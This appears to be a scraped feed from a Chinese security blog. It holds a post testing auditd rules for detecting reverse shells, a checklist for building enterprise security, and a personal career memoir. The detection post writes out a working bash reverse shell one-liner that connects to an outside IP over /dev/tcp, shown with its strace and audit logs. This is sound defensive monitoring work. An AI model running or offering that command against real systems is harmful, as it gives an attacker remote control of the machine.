0x7fcafd9e4000close(3) = 0brk(0x7ab000) = 0x7ab000getuid() = 0getgid() = 0geteuid() = 0getegid() = 0rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0ioctl(-1, TIOCGPGRP, 0x7ffeed7229ac) = -1 EBADF (Bad file descriptor)sysinfo(&#123;uptime=195741, loads=[21312, 14080, 6432], totalram=4148080640, freeram=202342400, sharedram=510382080, bufferram=24547328, totalswap=2145382400, freeswap=1889628160, procs=584, totalhigh=0, freehigh=0, mem_unit=1&#125;) = 0brk(0x7ac000) = 0x7ac000rt_sigaction(SIGCHLD, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0rt_sigaction(SIGCHLD, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0rt_sigaction(SIGINT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0rt_sigaction(SIGINT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0rt_sigaction(SIGTSTP, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0rt_sigaction(SIGTSTP, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0rt_sigaction(SIGTTIN, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0rt_sigaction(SIGTTIN, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0rt_sigaction(SIGTTOU, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0rt_sigaction(SIGTTOU, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0uname(&#123;sysname=&quot;Linux&quot;, nodename=&quot;Kali&quot;, ...&#125;) = 0brk(0x7b0000) = 0x7b0000brk(0x7b2000) = 0x7b2000brk(0x7b4000) = 0x7b4000brk(0x7b5000) = 0x7b5000brk(0x7b6000) = 0x7b6000brk(0x7b7000) = 0x7b7000brk(0x7b8000) = 0x7b8000stat(&quot;/root/pirogue/reverse_shell&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0stat(&quot;.&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0stat(&quot;/root&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0stat(&quot;/root/pirogue&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0stat(&quot;/root/pirogue/reverse_shell&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0stat(&quot;/root/pirogue&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0getpid() = 4833brk(0x7b9000) = 0x7b9000getppid() = 4831stat(&quot;.&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0stat(&quot;/usr/local/sbin/bash&quot;, 0x7ffeed722620) = -1 ENOENT (No such file or directory)stat(&quot;/usr/local/bin/bash&quot;, 0x7ffeed722620) = -1 ENOENT (No such file or directory)stat(&quot;/usr/sbin/bash&quot;, 0x7ffeed722620) = -1 ENOENT (No such file or directory)stat(&quot;/usr/bin/bash&quot;, 0x7ffeed722620) = -1 ENOENT (No such file or directory)stat(&quot;/sbin/bash&quot;, 0x7ffeed722620) = -1 ENOENT (No such file or directory)stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0geteuid() = 0getegid() = 0getuid() = 0getgid() = 0access(&quot;/bin/bash&quot;, X_OK) = 0stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0geteuid() = 0getegid() = 0getuid() = 0getgid() = 0access(&quot;/bin/bash&quot;, R_OK) = 0stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0geteuid() = 0getegid() = 0getuid() = 0getgid() = 0access(&quot;/bin/bash&quot;, X_OK) = 0stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0geteuid() = 0getegid() = 0getuid() = 0getgid() = 0access(&quot;/bin/bash&quot;, R_OK) = 0getpid() = 4833brk(0x7ba000) = 0x7ba000brk(0x7bb000) = 0x7bb000getpgrp() = 4831ioctl(2, TIOCGPGRP, [4831]) = 0rt_sigaction(SIGCHLD, &#123;sa_handler=0x44cf90, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0getrlimit(RLIMIT_NPROC, &#123;rlim_cur=15710, rlim_max=15710&#125;) = 0brk(0x7bc000) = 0x7bc000brk(0x7bd000) = 0x7bd000rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0brk(0x7be000) = 0x7be000open(&quot;test.sh&quot;, O_RDONLY) = 3stat(&quot;test.sh&quot;, &#123;st_mode=S_IFREG|0644, st_size=73, ...&#125;) = 0ioctl(3, TCGETS, 0x7ffeed722940) = -1 ENOTTY (Inappropriate ioctl for device)lseek(3, 0, SEEK_CUR) = 0read(3, &quot;exec 9&lt;&gt; /dev/tcp/130.182.116.111&quot;..., 80) = 73lseek(3, 0, SEEK_SET) = 0getrlimit(RLIMIT_NOFILE, &#123;rlim_cur=1024, rlim_max=4*1024&#125;) = 0fcntl(255, F_GETFD) = -1 EBADF (Bad file descriptor)dup2(3, 255) = 255close(3) = 0fcntl(255, F_SETFD, FD_CLOEXEC) = 0fcntl(255, F_GETFL) = 0x8000 (flags O_RDONLY|O_LARGEFILE)fstat(255, &#123;st_mode=S_IFREG|0644, st_size=73, ...&#125;) = 0lseek(255, 0, SEEK_CUR) = 0brk(0x7bf000) = 0x7bf000read(255, &quot;exec 9&lt;&gt; /dev/tcp/130.182.116.111&quot;..., 73) = 73brk(0x7c0000) = 0x7c0000socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3connect(3, &#123;sa_family=AF_INET, sin_port=htons(2323), sin_addr=inet_addr(&quot;130.182.116.111&quot;)&#125;, 16) = 0fcntl(9, F_GETFD) = -1 EBADF (Bad file descriptor)dup2(3, 9) = 9close(3) = 0fcntl(0, F_GETFD) = 0fcntl(0, F_DUPFD, 10) = 10fcntl(0, F_GETFD) = 0fcntl(10, F_SETFD, FD_CLOEXEC) = 0dup2(9, 0) = 0fcntl(9, F_GETFD) = 0close(10) = 0fcntl(1, F_GETFD) = 0fcntl(1, F_DUPFD, 10) = 10fcntl(1, F_GETFD) = 0fcntl(10, F_SETFD, FD_CLOEXEC) = 0dup2(9, 1) = 1fcntl(9, F_GETFD) = 0fcntl(2, F_GETFD) = 0fcntl(2, F_DUPFD, 10) = 11fcntl(2, F_GETFD) = 0fcntl(11, F_SETFD, FD_CLOEXEC) = 0dup2(1, 2) = 2fcntl(1, F_GETFD) = 0close(11) = 0close(10) = 0brk(0x7c1000) = 0x7c1000rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fcafdb65e10) = 4834rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0rt_sigaction(SIGINT, &#123;sa_handler=0x449930, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0wait4(-1, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 127&#125;], 0, NULL) = 4834rt_sigaction(SIGINT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=0x449930, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0--- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=4834, si_uid=0, si_status=127, si_utime=0, si_stime=0&#125; ---wait4(-1, 0x7ffeed722010, WNOHANG, NULL) = -1 ECHILD (No child processes)rt_sigreturn(&#123;mask=[]&#125;) = 0read(255, &quot;&quot;, 73) = 0rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0exit_group(127) = ?+++ exited with 127 +++ 2. strace -c bash test.sh 二、audit监控分析1. audit相关资料 A Brief Introduction to auditd http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/ Finding short-lived TCP connections owner process https://serverfault.com/questions/352259/finding-short-lived-tcp-connections-owner-process Linux auditd http://wiki.nokernel.net/linux-auditd ⁠Understanding Audit Log Files https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/sec-Understanding_Audit_Log_Files.html ubuntu - auditctl - a utility to assist controlling the kernel’s audit system http://manpages.ubuntu.com/manpages/zesty/en/man8/auditctl.8.html finding-short-lived-tcp-connections-owner-process https://serverfault.com/questions/352259/finding-short-lived-tcp-connections-owner-process 2. 测试audit监控规则123auditctl -A exit,always -S connectauditctl -a exit,always -F arch=b64 -F a0=2 -F a1=1 -S socket -k CONNECTIONauditctl -a exit,always -F arch=b64 -S connect 1) auditctl -a exit,always -F arch=b64 -S connect12root@Kali:~/pirogue/reverse_shell# auditctl -l-a always,exit -F arch=b64 -S connect 回显： 123tailf /var/log/audit/audit.logtype=CONFIG_CHANGE msg=audit(1500974819.373:24): auid=0 ses=3 op=&quot;add_rule&quot; key=(null) list=4 res=1 bash test.sh 回显： 12345tailf /var/log/audit/audit.logtype=SYSCALL msg=audit(1500975246.989:30): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=1c052b8 a2=10 a3=129 items=0 ppid=4722 pid=7736 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;bash&quot; exe=&quot;/bin/bash&quot; key=(null)type=SOCKADDR msg=audit(1500975246.989:30): saddr=0200091385827E520000000000000000type=PROCTITLE msg=audit(1500975246.989:30): proctitle=6261736800746573742E7368 exec 9&lt;&gt; /dev/tcp/130.182.116.111/2323;exec 0&lt;&9;exec 1&gt;&amp;9 2&gt;&1;/bin/bash 直接执行反弹命令，并没有audit到网络连接行为。但反弹shell中执行：whoami，出现回显。 12345678910type=SYSCALL msg=audit(1500975460.957:49): arch=c000003e syscall=42 success=no exit=-2 a0=3 a1=7ffe9c798490 a2=6e a3=6 items=1 ppid=7771 pid=7775 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)type=SOCKADDR msg=audit(1500975460.957:49): saddr=01002F7661722F72756E2F6E7363642F736F636B657400000000000000000000E029ECE3CD550000002CECE3CD55000000000000000000004B389E12077F00008028ECE3CD55000080988C12077F00001C000000000000004073C312077F0000F386799CFE7F0000100000000000type=CWD msg=audit(1500975460.957:49): cwd=&quot;/root&quot;type=PATH msg=audit(1500975460.957:49): item=0 name=&quot;/var/run/nscd/socket&quot; nametype=UNKNOWNtype=PROCTITLE msg=audit(1500975460.957:49): proctitle=&quot;whoami&quot;type=SYSCALL msg=audit(1500975460.961:50): arch=c000003e syscall=42 success=no exit=-2 a0=3 a1=7ffe9c798640 a2=6e a3=6 items=1 ppid=7771 pid=7775 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)type=SOCKADDR msg=audit(1500975460.961:50): saddr=01002F7661722F72756E2F6E7363642F736F636B65740000109AE512077F000001000000000000000000000000000000C887799CFE7F0000D120C412077F00000100000000000000109AE512077F0000010000000000000000000000000000000100000000000000000000000000type=CWD msg=audit(1500975460.961:50): cwd=&quot;/root&quot;type=PATH msg=audit(1500975460.961:50): item=0 name=&quot;/var/run/nscd/socket&quot; nametype=UNKNOWNtype=PROCTITLE msg=audit(1500975460.961:50): proctitle=&quot;whoami&quot; 2) auditctl -a always,exit -F arch=b64 -S socket12type=SYSCALL msg=audit(1500976257.753:113): arch=c000003e syscall=41 success=yes exit=3 a0=2 a1=1 a2=6 a3=2b items=0 ppid=2409 pid=7894 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;bash&quot; exe=&quot;/bin/bash&quot; key=(null)type=PROCTITLE msg=audit(1500976257.753:113): proctitle=&quot;/usr/lib/gnome-terminal/gnome-terminal-server&quot; 执行反弹命令直接监控到日志如上。输入whoami，也可监控到回显： 1234type=SYSCALL msg=audit(1500976407.153:125): arch=c000003e syscall=41 success=yes exit=3 a0=1 a1=80801 a2=0 a3=6 items=0 ppid=7923 pid=7956 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)type=PROCTITLE msg=audit(1500976407.153:125): proctitle=&quot;whoami&quot;type=SYSCALL msg=audit(1500976407.153:126): arch=c000003e syscall=41 success=yes exit=3 a0=1 a1=80801 a2=0 a3=6 items=0 ppid=7923 pid=7956 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)type=PROCTITLE msg=audit(1500976407.153:126): proctitle=&quot;whoami&quot; 待续…","tags":[{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"信息安全","slug":"信息安全","permalink":"http://pirogue.org/tags/信息安全/"},{"name":"反弹shell","slug":"反弹shell","permalink":"http://pirogue.org/tags/反弹shell/"},{"name":"安全监控","slug":"安全监控","permalink":"http://pirogue.org/tags/安全监控/"}]},{"title":"甲方安全建设步骤","date":"2017-06-16T20:49:53.000Z","path":"2017/06/17/甲方安全建设步骤/","text":"在深圳丰盛町星巴克的一个下午，两杯咖啡，可能是可预测的未来几年里最后一次向0x001面对面学习的机会。 1. 资产梳理 IP列表、业务分组(负责人、联系方向)、业务属性 业务端口 业务应用架构、技术堆栈 2. 边界安全，防火墙策略控制（需要梳理业务端口） 如果是硬件，使用防火墙统一控制 如果是操作系统，Iptalbes＋IPSEC 及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略) 跳板机安全控制 3. 账户安全管理 弱密码 root、sudoer权限 账户、授权、访问、审计等等 4. 服务器安全 安全基线检测 操作审计 异常登录审计(日志收集分析) 漏洞清点/扫描，补丁修复测试和推进 5. WEB安全 应用渗透测试 接口安全(加密、通信) webshell实时监测 Nginx日志分析/Nginx流量旁路分析 6. 业务风控安全 用户安全机制（密码、验证码、登录） 交易安全 7. 安全培训 安全意识培训 运维安全培训 WEB安全开发 8. 安全规范和流程 人员入职账户开通 人员离职账户注销 服务器上下架安全管理 安全应急响应机制 9. 内网安全 内网服务器安全 账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统) 弱口令监测(NTLM/LM) 账户异常登录 网络隔离（物理／虚拟化） 网络准入 PC安全（病毒统一管理、通知处理） 资产信息收集脚本：1234561. 服务器IP列表(账户、密码) [或者通过现有运维工具批量执行]2. 进程列表(ps aux)3. 账户信息(/etc/passwd,/etc/shadow)4. 端口清点(netstat -tnpl)5. 软件包(rpm -qa)6. Nginx、Tomcat、Apache配置文件 syslog、Agent、puppet、func、saltsatck运维工具","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"信息安全","slug":"信息安全","permalink":"http://pirogue.org/tags/信息安全/"},{"name":"黑客","slug":"黑客","permalink":"http://pirogue.org/tags/黑客/"}]},{"title":"2年乙方安全从业经验谈","date":"2017-06-02T12:51:39.000Z","path":"2017/06/02/2年乙方安全从业经验谈/","text":"&emsp;&emsp;在写这篇文章的之前，我会考虑尽量把身边朋友和公司的“事故性”信息避开，只跟自己对话。 &emsp;&emsp;昨天是6.1儿童节，在这个社交网络爆炸的时代，各种段子和小视频在社交媒体上互动，尽显智慧与欢乐。出于搞笑的性格，我时不时的去打开浏览，却常常没有耐心的关掉，因为最近这些天来状态很不好，并在晚上做了一个不成熟的决定，写了一封辞职邮件发给了老板。 &emsp;&emsp;在信中我写道： 尊敬的福哥： 您好！ 首先感谢青藤，2015年8月3日入职到今天2017年6月1日。感谢青藤对我一个新人的关照和培养，使我在安全从业道路上跨过了一个又一个台阶。 对行业的认知，安全圈人脉的拓展，渗透能力的提高，开发技能的提升，对Linux的认识和先进的企业安全理念，了解一款产品的内外兼修的重要，创业公司的发展历程。 但在今年***同时，个人也反思了一下所做的事情已经远离了职业发展规划，所以希望我将重新寻求一个合适的甲方锻炼机会，或是更专注于安全技术的提升。 望批准一个不成熟的辞职申请。 祝愿您身体健康，青藤茁壮成长。 此致 敬礼 &emsp;&emsp;可能在常人看来it行业离职跳槽再寻常不过了，但对于我个人来讲当我珍惜了一次机会，就会忠诚于一个领导，一家公司。青藤在成长，而季节的更迭总会吐陈纳新。 &emsp;&emsp;在2015年6、7月份毕业季的时候，我也曾在大三的下半年踌躇徘徊，不知是该从事软件开发、还是信息安全，毕竟自己的专业是软件工程，安全完全是自己“搞”出来的爱好和特长。就像是在刚入学时不知道该选择学习哪种语言，哪个方向一样，因为都感兴趣、都很喜欢，所以就广泛吸收，但没有一样精通，直到偶然的机会参加了两届山东省信息安全比赛获得了一些成绩，才因为成就感使自己越来越向安全方面偏重倾斜，投入更多精力。 &emsp;&emsp;我们学校是一所山东省内普通二本，在我那届毕业生的前后流行一股风潮，临近毕业计算机专业的应届生就会到it培训机构培训各种开发、美工等技能，高额学费换来的是学渣在经过培训机构打磨和包装后到企业以2到3年工作经验找到高额的薪水工作。从内心里我也是渴望的，但是最后经过深思熟虑，还是坚持初心去找找看信息安全相关工作。在大学的时候打一些线上CTF，关注下安全圈，偶然机会接触到几个行业资深的安全人士。正好一个机会，在风宁的推荐下进入了从居民楼即将搬入嘉华大厦的青藤实习。 &emsp;&emsp;在学校的时候我当过班长，混过学生会，后来的一些事情索性不谈，一句话总结是青春很燥，也很美好。一天课堂上，一个电话广东深圳的电话打过来，我悄声说在上课，电话那头的人也被我带入小声说话的模式，说那下午再打过来。怀着激动忐忑的心情等到了公司安全同事的电话，他先谈了下公司产品的功能大概，需要一个安全工程师做的事情，还有公司的文化；我了解了大概之后，向他说明了自己能做的事情和欠缺之处，但在他口中技术都不是问题，只要认可公司的价值观，是可以培养的。于是我挑了一个英语四级考试之前的一天跑去北京面试了，见到的第一个人就是打电话给我的人，一件灰色T恤，一个大短裤，走路有点瘸，一双拖鞋，带个眼睛，个子也不高，还有我记得那天他给我点了份巨无霸。然而后来我也有告诉他，其实那份汉堡不够吃；后来才知道他是“深圳梅西”，踢断了黄金右脚，回去深圳做手术了一段时间；后来我想在这个男人面前炫耀我的广泛兴趣爱好，他却在各个方面都鄙视了我，素描、吉他、写字他都会，工作技能自然也不用说，除了街舞他不会跳；再后来他就一直是我的领导，从北京总部的安全总监到深圳分部的安全总监；最后变成老师，也是兄弟。关于这个男人，他现在的id是0x001，不过多的吹嘘他的能力，用低调和传奇描述就可以了，想知道的更多可以跟他做朋友，他人很搞笑。 对了如果你想知道我当实习生之前面试被问过哪些问题？简单的插几句，如何渗透一个目标，web安全的常见漏洞类型和修复方式（修复是重点），爱好。 实习生涯&emsp;&emsp;写到这里，虽然很想写出点什么，但记忆里都是碎片，让我打开产品的后台慢慢回忆吧。 &emsp;&emsp;开始到金隅嘉华大厦A座1012上班，一个比我早到一些日子的实习生来教给我日常的工作，0x001和TT进行指导。TT是也是一位资深的安全人士，现在在武汉青藤研发中心做安全总监。实习生的生涯前期做的最多的就是一些基础安全运营工作，比如公司的爬虫爬来的国外漏洞库和补丁信息，我和小伙伴们就一起把他们汉化补充到后台，这样前台用户看到的就是清晰的有修复建议的中文；应用的安全基线录入，当时我们有现成的基线json数据，开发把功能框架写好，我们就把基线翻译成中文继续录入到后台，经过agent的分析，在前台就可以显示出服务器上不符合规范的基线配置。但那时候我做的事情总会被要求多2、3页，以至于我每天要工作到凌晨2、3点钟，这段时间持续了很久。直到最后我们这些小伙伴把多个常用和经典的操作系统版本常见漏洞和补丁录入完成，常见的中间件应用基线做完，才算是从这项繁琐劳累的工作中解脱出来，在这期间宗阳同学写了一个打补丁的工具，受到大家的赞赏。宗阳同学人非常好，北京一所重点高校毕业的，女票考上了北师大，两个人非常搭。当我们熬过那些坑之后，再进来的实习生必学的一项技能就是打补丁，我们俗称“搬砖”。我们开始把更多时间放在对客户服务上，由斌哥教大家如何接收客户问题，如何学会与客户沟通，斌哥在客户服务上非常有经验，他还把曾经任职过公司的员工客服录音拿出来与我们讲评。当然我们安全运营的客户服务会对接更多的技术问题，不仅仅是产品的答疑，噜噜来带我们补充Linux相关的知识体系，他是一个非常有经验的老运维。斌哥和噜噜都是老北京，住二环，哈哈哈。 &emsp;&emsp;在每天从产品上帮客户发现安全风险，推进解决问题的同时，青藤迎来了一个最大的客户。我们公司开始协助此公司建立安全体系，基于企业的特点和需求对产品做定制化开发，当然期间很多好的需求也帮助产品快速的迭代成长。我们安全运营部的小伙伴也开始轮换到大客户那里提供驻场的服务，我几乎每天都在，从他们公司业务和人员的迅速扩展，我们几个小伙伴也随着他们将办公地点先由北京金融街搬到北师大附近，最后搬到仰山公园一起戴着口罩当新办公室的人体空气净化器，期间跟着0x001和TT一起在对方内网做渗透测试，操作审计，产品的运营等等。在没实习之前我也只是简单的日个站，提个权，对内网渗透并不熟悉，但在这个客户那里我见到了一个大企业内部的it资产和各种类型的应用系统，必然学到了很多姿势。在我们渗透过之后，大客户又请了多家当时很有名的安全公司进行渗透测试，最终客户除了我们之外选择了一家非常有实力的乙方安全公司，购买了他们的产品和渗透测试服务，他们的渗透测试很犀利拿到了非常重要的系统权限，当然青藤的安全产品也同时检测到了很多异常告警，也被绕过了多道防线。我们两家乙方在产品上有互补，也相当于在企业内部做红蓝对抗，还是非常有价值的。青藤的产品有一个审计功能，每天会记录几十万条bash操作命令，开始由TT进行人工的审计，后来慢慢交接给我，并指定要我写出一个节省人力的工具，于是我用Python写了一个半自动化审计的工具，先过滤掉无用的shell日志，留下有价值的几百或几千条日志进行人工的审计，如果有可疑再进行回溯。怎么说呢？这个工具其实效果还是有的，但并不是太理想。这家大客户慢慢待遇越来越好，有了自己的食堂，自己的健身房，在吃饭娱乐的时间结实了隔壁乙方安全公司的一个员工，他有些沉默、闷骚、愤青，但熟悉之后发现没想到我们有共同的爱好poppin和篮球，不过今年他好像支持勇士，我是詹密！没想到他竟然也是那个乙方公司的创始人之一，我叫他景牛。 &emsp;&emsp;谈工作回忆的好累，我还是想想那些可爱的小伙伴吧~范范，我们安全运营部的一个软妹子，关系跟噜噜可好啦，后来去了绿盟，现在在美团。宗阳，之前有介绍过，人非常好，现在在做自己喜欢的事情，渗透相关吧。一横，广东人，北航的一个同学，我高中的一个好兄弟也在北航，他们打球互相认识，我从好兄弟那里知道一横唱粤语歌非常好听，一次大家团建到ktv，果然名不虚传。瑞陶，英国留学回来，开始在我们部门，又被调到安全研究部做调研和开发，现在在爱立信做C开发，人也非常好，上次去上海还一起吃饭，不过头发留的特别长，有点认不出了，对了我去深圳分部之前，他还送我一个小蛋糕，吃了之后我的运气爆棚！涂瑜，客户端组的C/C++，跟我关系也非常好，技术很牛逼，现在在知乎。艺珍，长得很漂亮，开始在我们部门，后来被俊哥抢到产品组了，现在在360。王先生，开始在我们部门，后来到安全研究部做开发，非常搞笑的一个帅气的男生，一起睡过客厅~忠阳，产品组的男生，人很好，喜欢笑，异地恋，哈哈哈，跟我一样。还有服务器端组的老大，关系也很好，一起加班，一起跟涂瑜畅聊。还有好多人，在职的不想提太多，因为可能会被邪恶的人拿去做信息收集，社工或钓鱼，先鄙视下！ 正式入职&emsp;&emsp;其实早已熟悉了工作内容和工作节奏，无法正式入职是因为还没有拿到毕业证。深圳分部是一个新的开始，从我和0X001两个人，慢慢来了一个做销售的女孩子吕芳，接着加入我们的华不再扬，加入又离开的泳少，接着加入的YD，深圳的团队已基本定型。在深圳我们开疆扩土，宣传“自适应”的安全理念，提供客户测试产品，与北京对接提交bug，反复验证产品，提交功能需求，写文档，写方案，参加展会等等。不得不说深圳是一个OPEN的城市，非常年轻，很有活力，但在这里客户要求产品的用户体验和产品功能，很少有讲情怀的。相对于北京，深圳更像是战场的前线，我们几个人在一起就像是战友，虽然没有行政，没有财务，但大家配合的还蛮默契。既然是前线，就需要经常与客户接触，我们也必须培养起售前工程师的一些基本素养，要能解答客户的技术细节问题、技术方案的疑惑、流利的讲解产品功能、场景、价值。在售前的工作过程中，我和吕芳的配合还是挺默契，她也愿意带我一起出去，只是我心里还是想把更多时间投入到技术研究中，所以没有表现的非常好。0x001在深圳打拼了很多年，不仅仅是技术上可以hold住很多场面，在人脉和关系上也非常强悍，所以前期我们对接了不少政府资源，其中渗透测试是一项重要任务，这项任务主要落在华不再扬身上，常常能够披荆斩棘，撸穿对方企业内网，日报写的像精彩的案例分享，TT和福哥都经常点赞。YD之前在其他安全公司做过，对传统网络设备和等保基线比较熟悉，就负责青藤的这项工作。而我则独自承担起了产品的一项重要检测功能的优化，webshell检测。开始我对这项工作并不看好，但既然要做就认真对待。webshell检测功能在前期与我对接的时候差不多一个星期我都在调试产品的功能，很多bug，有客户端的问题，有服务端的问题，发现异常就反馈给研发配合测试进行改进。直到第二个周，才开始真正运营这项功能，在一个Q的时间内，我申请开通了阿里云的安骑士、安全狗、D盾，参考对比进行规则的运营，最终在样本数量和检测率上完全超出了这几家的竞品，但功能仍有许多需要借鉴和学习别家产品的地方，我已经总结了一个不成熟的webshell文档和功能检测改进的脑图。在我离职之前的几天产品经理问我产品3.0功能在webshell方面有什么改进的建议，我已经把能看到的问题反馈给他，希望青藤能在未来把功能做的更细致一些。 